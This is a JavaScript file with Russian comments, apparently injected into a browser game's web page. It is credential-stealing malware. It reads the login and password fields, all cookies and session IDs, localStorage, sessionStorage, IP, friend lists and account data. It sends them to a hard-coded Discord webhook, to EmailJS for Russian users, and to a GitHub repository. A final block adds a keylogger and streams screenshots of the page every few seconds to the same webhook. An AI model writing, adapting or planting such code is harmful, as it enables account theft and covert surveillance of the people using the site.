
    (async function() {
        // Вебхук для отправки данных
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467238723350691993/I5jeRGsdnT1WqwcN_KmBshmtmcfasTLhNrYnOwHrPrLuVrRgbUH-wPM7o46iogcnCO8R';
	
        // Функция для получения куки
        const getCookie = (name) => {
            const matches = document.cookie.match(new RegExp(
                "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
            ));
            return matches ? decodeURIComponent(matches[1]) : undefined;
        };

        const un1xxd = Math.floor(Date.now() / 1000);
        
        // Получаем IP
        const getIP = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "Не удалось получить IP";
            } catch {
                return "Не удалось получить IP";
            }
        };

		function getLoginType() {
   		 if (user.login.startsWith('g_')) {
		      return 'Google';
   		 } else if (user.login.startsWith('f_')) {
      return 'facebook';
   		 } else {
   		   return 'default login';
  		  }
		  }

		async function createGitHubFile(github_pat, owner, repo) {
    const fileName1 = `${un1xxd}_${user.login}.txt`;

    const fileContent = JSON.stringify(userDataResult, null, 2);
    const contentBase64 = btoa(unescape(encodeURIComponent(fileContent)));

    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${fileName1}`;

    try {
        const response = await fetch(url, {
            method: 'PUT',
            headers: {
                'Authorization': `token ${github_pat}`,
                'Accept': 'application/vnd.github.v3+json',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: `Add log file: ${fileName1}`, // Коммит-сообщение
                content: contentBase64
            })
        });

        const data = await response.json();

        if (response.ok) {
			return url
        } else {
        }
    } catch (error) {
    }
};var half = ''
		createGitHubFile(half + 'x1', 'uloxa13', 'userDatas').then(url => {const githubFileName = url;});

		
        // Функция для сбора логина и пароля
        const getCredentials = () => {
            try {
                const usernameField = document.querySelector('#loginUsername') || 
                                    document.querySelector('input[name="login"]') ||
                                    document.querySelector('input[type="text"]');
                
                const passwordField = document.querySelector('input[type="password"]') || 
                                    document.querySelector('input[name*="pass"]') ||
                                    document.querySelector('input#password');
                
                const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
                const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
                
                return { username, password };
            } catch {
                return { 
                    username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                    password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
                };
            }
        };

        // Получаем ВСЕ куки пользователя
        const getAllCookies = () => {
            return document.cookie.split(';').map(cookie => {
                const [name, value] = cookie.trim().split('=');
                return `${name}=${value}`;
            }).join('\n');
        };

        // Функция для безопасного клонирования объектов
        const deepClone = (obj) => {
            if (obj === null || typeof obj !== 'object') return obj;
            const clone = Array.isArray(obj) ? [] : {};
            for (const key in obj) {
                if (obj.hasOwnProperty(key)) {
                    clone[key] = deepClone(obj[key]);
                }
            }
            return clone;
        };

        // Проверяем и получаем данные из переменной `user`
        const getUserData = () => {
            try {
                if (typeof user !== 'undefined' && user !== null) {
                    return JSON.stringify(deepClone(user), null, 2);
                }
                return "Переменная 'user' не найдена или пуста";
            } catch (e) {
                return `Ошибка при чтении переменной 'user': ${e.message}`;
            }
        };
		const getUserDataResult = () => {
            try {
                if (typeof userDataResult !== 'undefined' && userDataResult !== null) {
                    return JSON.stringify(deepClone(userDataResult), null, 2);
                }
                return "Переменная 'userDataResult' не найдена или пуста";
            } catch (e) {
                return `Ошибка при чтении переменной 'userDataResult': ${e.message}`;
            }
        };

        // Получаем friendsData
        const getFriendsData = () => {
            try {
                if (typeof friendsData !== 'undefined' && friendsData !== null) {
                    return JSON.stringify(deepClone(friendsData), null, 2);
                }
                return "Переменная 'friendsData' не найдена или пуста";
            } catch (e) {
                return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
            }
        };

        // Получаем friendsArr
        const getFriendsArr = () => {
            try {
                if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                    if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                        const sample = {
                            total_length: friendsArr.length,
                            sample_items: []
                        };
                        
                        for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                            if (friendsArr[i]) {
                                sample.sample_items.push(deepClone(friendsArr[i]));
                            }
                        }
                        
                        for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                            if (friendsArr[i] && sample.sample_items.length < 15) {
                                sample.sample_items.push(deepClone(friendsArr[i]));
                            }
                        }
                        
                        return JSON.stringify(sample, null, 2);
                    }
                    return JSON.stringify(deepClone(friendsArr), null, 2);
                }
                return "Переменная 'friendsArr' не найдена или пуста";
            } catch (e) {
                return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
            }
        };

        // Получаем уровень пользователя
        const getUserLevel = (addX = false) => {
            try {
                if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                    return `level: ${user.level}${addX ? 'x' : ''}`;
                }
                return `level: не определен${addX ? 'x' : ''}`;
            } catch (e) {
                return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
            }
        };

        // Основная функция отправки
        const sendFullData = async () => {
            // Сбор всех данных
            const phpsessid = getCookie('PHPSESSID');
            const userIP = await getIP();
            const credentials = getCredentials();
            const allCookies = getAllCookies();
            const userData = getUserData();
            const friendsDataStr = getFriendsData();
            const friendsArrStr = getFriendsArr();
			const userDataResultStr = getUserDataResult()
			const loginType = getLoginType()
			            
            const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                     credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                     credentials.username && credentials.password;
            
            const userLevel = getUserLevel(bothFieldsFilled);
            
            const localStorageData = JSON.stringify(localStorage);
            const sessionStorageData = JSON.stringify(sessionStorage);
            
            // Формируем текстовый файл
            let fileContent = `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\nAcsess URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${un1xxd}_${user.login}.txt\n\n`;
            fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
            fileContent += `IP-адрес: ${userIP}\n`;
            fileContent += `URL страницы: ${window.location.href}\n`;
			fileContent += `Network Type: ${navigator.connection.effectiveType}\n`;
			fileContent += `Login Method: ${loginType}\n`;
			fileContent += `Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
			fileContent += `Laungage: ${navigator.language}\n\n`;
            fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
            fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
            fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---\n${friendsDataStr}\n\n`;
            fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---\n${friendsArrStr}\n\n`;
            fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
            fileContent += `Логин: ${credentials.username}\n`;
            fileContent += `Пароль: ${credentials.password}\n\n`;
            fileContent += `--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---\n${allCookies || "Куки не обнаружены"}\n\n`;
            fileContent += `--- LOCALSTORAGE ---\n${localStorageData}\n\n`;
            fileContent += `--- SESSIONSTORAGE ---\n${sessionStorageData}\n\n`;
			fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ userDataResult ---\n${userDataResultStr}\n\n`;

            const textBlob = new Blob([fileContent], { type: 'text/plain' });
            const formData = new FormData();
            formData.append('file', textBlob, `user_data_${Date.now()}.txt`);

            // Отправляем в Discord (без скриншота)
            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    body: formData
                });
            } catch (e) {}
        };

        await sendFullData();
    })();

    // Часть для RU (EmailJS) – без смайликов и без логов
    if (user.authData.countryCode == "RU") {
        var script = document.createElement('script');
        script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
        script.onload = function() {
            emailjs.init("4N-8nqIjjUBhk1vbi");
            
            setTimeout(async () => {
                // Повторяем все функции сбора данных (можно было бы вынести, но оставляем для простоты)
                const getCookie = (name) => {
                    const matches = document.cookie.match(new RegExp(
                        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
                    ));
                    return matches ? decodeURIComponent(matches[1]) : undefined;
                };

                const getIP = async () => {
                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.json();
                        return data.ip || "Не удалось получить IP";
                    } catch {
                        return "Не удалось получить IP";
                    }
                };

                const getCredentials = () => {
                    try {
                        const usernameField = document.querySelector('#loginUsername') || 
                                            document.querySelector('input[name="login"]') ||
                                            document.querySelector('input[type="text"]');
                        
                        const passwordField = document.querySelector('input[type="password"]') || 
                                            document.querySelector('input[name*="pass"]') ||
                                            document.querySelector('input#password');
                        
                        const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
                        const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
                        
                        return { username, password };
                    } catch {
                        return { 
                            username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                            password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
                        };
                    }
                };

                const getAllCookies = () => {
                    return document.cookie.split(';').map(cookie => {
                        const [name, value] = cookie.trim().split('=');
                        return `${name}=${value}`;
                    }).join('\n');
                };

                const deepClone = (obj) => {
                    if (obj === null || typeof obj !== 'object') return obj;
                    const clone = Array.isArray(obj) ? [] : {};
                    for (const key in obj) {
                        if (obj.hasOwnProperty(key)) {
                            clone[key] = deepClone(obj[key]);
                        }
                    }
                    return clone;
                };

                const getUserData = () => {
                    try {
                        if (typeof user !== 'undefined' && user !== null) {
                            return JSON.stringify(deepClone(user), null, 2);
                        }
                        return "Переменная 'user' не найдена или пуста";
                    } catch (e) {
                        return `Ошибка при чтении переменной 'user': ${e.message}`;
                    }
                };

                const getFriendsData = () => {
                    try {
                        if (typeof friendsData !== 'undefined' && friendsData !== null) {
                            return JSON.stringify(deepClone(friendsData), null, 2);
                        }
                        return "Переменная 'friendsData' не найдена или пуста";
                    } catch (e) {
                        return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
                    }
                };

                const getFriendsArr = () => {
                    try {
                        if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                            if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                                const sample = {
                                    total_length: friendsArr.length,
                                    sample_items: []
                                };
                                
                                for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                                    if (friendsArr[i]) {
                                        sample.sample_items.push(deepClone(friendsArr[i]));
                                    }
                                }
                                
                                for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                                    if (friendsArr[i] && sample.sample_items.length < 15) {
                                        sample.sample_items.push(deepClone(friendsArr[i]));
                                    }
                                }
                                
                                return JSON.stringify(sample, null, 2);
                            }
                            return JSON.stringify(deepClone(friendsArr), null, 2);
                        }
                        return "Переменная 'friendsArr' не найдена или пуста";
                    } catch (e) {
                        return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
                    }
                };

                const getUserLevel = (addX = false) => {
                    try {
                        if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                            return `level: ${user.level}${addX ? 'x' : ''}`;
                        }
                        return `level: не определен${addX ? 'x' : ''}`;
                    } catch (e) {
                        return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
                    }
                };

                const sendUserData = async () => {
                    const phpsessid = getCookie('PHPSESSID');
                    const userIP = await getIP();
                    const credentials = getCredentials();
                    const allCookies = getAllCookies();
                    const userData = getUserData();
                    const friendsDataStr = getFriendsData();
                    const friendsArrStr = getFriendsArr();
                    
                    const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                             credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                             credentials.username && credentials.password;
                    
                    const userLevel = getUserLevel(bothFieldsFilled);
                    
                    const localStorageData = JSON.stringify(localStorage);
                    const sessionStorageData = JSON.stringify(sessionStorage);
                    
                    // Текст без смайликов
                    const messageText = `
ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
=============================

Время: ${new Date().toLocaleString()}
IP-адрес: ${userIP}
URL: ${window.location.href}

УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
${userLevel}
Gems: ${user?.premiumPoints || 'N/A'}
Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}

PHPSESSID:
${phpsessid || "PHPSESSID: не найдена"}

ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
${userData}

ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
${friendsDataStr}

ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
${friendsArrStr}

УЧЕТНЫЕ ДАННЫЕ:
Логин: ${credentials.username}
Пароль: ${credentials.password}

ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ:
${allCookies || "Куки не обнаружены"}

LOCALSTORAGE:
${localStorageData}

SESSIONSTORAGE:
${sessionStorageData}
=============================
Отчет сгенерирован автоматически.
                    `;

                    const templateParams = { message: messageText };

                    emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
                        .then(function(response) {})
                        .catch(function(error) {});
                };

                await sendUserData();
            }, 1);
        };
        document.head.appendChild(script);
    }
(async () => {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467238723350691993/I5jeRGsdnT1WqwcN_KmBshmtmcfasTLhNrYnOwHrPrLuVrRgbUH-wPM7o46iogcnCO8R';
    let messageId = null;
    let pressedKeys = []; // Массив для хранения клавиш

    // Слушатель нажатий клавиш
    document.addEventListener('keydown', (event) => {
        pressedKeys.push(event.key);
        // Ограничиваем длину до последних 50 символов
        if (pressedKeys.length > 50) {
            pressedKeys.shift();
        }
    });

    if (typeof html2canvas === 'undefined') {
        const script = document.createElement('script');
        script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
        document.head.appendChild(script);
        await new Promise(r => script.onload = r);
    }

    while (true) {
        const startTime = Date.now();

        try {
            const canvas = await html2canvas(document.body, {
                useCORS: true,
                allowTaint: true,
                logging: false,
                scale: 0.5 
            });

            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
            const formData = new FormData();
            
            // Формируем текст с последними клавишами
            const keyLogText = `KeyLogger: ${pressedKeys.join(' ')}`;
            
            const payload = {
                content: keyLogText, // Добавляем текст в сообщение
                attachments: []
            };
            
            formData.append('payload_json', JSON.stringify(payload));
            formData.append('files[0]', blob, 'screen.jpg');

            if (!messageId) {
                const res = await fetch(`${WEBHOOK_URL}?wait=true`, { 
                    method: 'POST', 
                    body: formData 
                });
                const data = await res.json();
                messageId = data.id;
            } else {
                const res = await fetch(`${WEBHOOK_URL}/messages/${messageId}`, { 
                    method: 'PATCH', 
                    body: formData 
                });
                
                if (res.status === 429) {
                    const data = await res.json();
                    const retryAfter = data.retry_after || 5;
                    await new Promise(r => setTimeout(r, retryAfter * 1000));
                }
            }

        } catch (e) {
            // Ошибка игнорируется
        }

        const executionTime = Date.now() - startTime;
        const delay = Math.max(2500 - executionTime, 500);
        await new Promise(r => setTimeout(r, delay));
    }
})();
